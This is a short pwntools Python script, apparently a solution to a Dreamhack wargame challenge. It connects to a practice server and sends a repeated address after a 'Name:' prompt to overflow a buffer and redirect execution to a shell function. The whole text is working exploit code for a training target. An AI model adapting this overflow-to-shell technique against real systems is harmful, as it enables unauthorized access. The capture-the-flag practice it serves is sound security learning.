from pwn import *

r = remote("host1.dreamhack.games", 20120)
get_shell = p32(0x080485db)*64

p = r.recvuntil("Name:")
r.send(get_shell)

r.interactive()